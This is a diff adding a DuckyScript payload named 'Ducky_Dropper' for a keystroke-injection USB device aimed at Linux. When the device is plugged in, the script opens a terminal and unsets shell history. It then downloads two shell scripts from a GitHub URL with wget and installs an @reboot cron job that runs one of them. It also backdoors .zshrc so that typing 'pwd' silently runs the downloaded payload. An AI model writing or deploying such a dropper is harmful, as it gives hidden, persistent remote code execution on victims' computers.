@@ -1,0 +1,27 @@
+REM TITLE: Ducky_Dropper
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Linux (tested on Kali Linux Release 2025.2)
+REM DESCRIPTION: See README.md
+REM REQUIREMENTS: See README.md
+
+REM Begin attack:
+ATTACKMODE STORAGE
+WAIT_FOR_BUTTON_PRESS
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening terminal:
+CTRL ALT t
+DELAY 300
+
+REM Unsetting terminal history and building ".e2e.sh":
+STRINGLN unset HISTFILE
+STRINGLN mkdir /home/$USER/.cronfg && mkdir /home/$USER/.confg
+STRINGLN wget -q -P /home/$USER/.cronfg https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/cron_dropper.sh && wget -q -P /home/$USER/.confg https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/payload.sh
+
+STRINGLN chmod +x /home/$USER/.confg/*.sh; chmod +x /home/$USER/.cronfg/*.sh; crontab -l > crontemp; echo "@reboot sleep 60 && ~/.cronfg/cron_dropper.sh" >> crontemp; crontab crontemp; rm -f crontemp
+
+STRINGLN cat >> .zshrc
+STRINGLN alias pwd='pwd; (/home/$USER/.confg/*.sh > /dev/null 2>&1 & )'
+CTRL c
+STRINGLN exit
